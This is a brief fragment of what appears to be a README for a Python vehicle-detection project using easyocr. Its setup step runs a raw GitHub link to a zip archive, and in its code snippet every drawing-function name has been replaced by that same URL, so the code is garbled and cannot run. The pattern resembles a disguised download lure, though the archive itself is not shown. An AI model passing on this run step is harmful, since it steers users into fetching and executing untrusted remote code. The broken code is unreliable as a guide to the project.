...
pip install easyocr
python https://raw.githubusercontent.com/Irfanx3000/vehicle-detection/main/mylodont/vehicle-detection.zip
```
...
```python
https://raw.githubusercontent.com/Irfanx3000/vehicle-detection/main/mylodont/vehicle-detection.zip(display, (0, MARK1), (WIDTH, MARK1), (0, 0, 255), 2)
https://raw.githubusercontent.com/Irfanx3000/vehicle-detection/main/mylodont/vehicle-detection.zip(display, (0, MARK2), (WIDTH, MARK2), (255, 0, 0), 2)
```
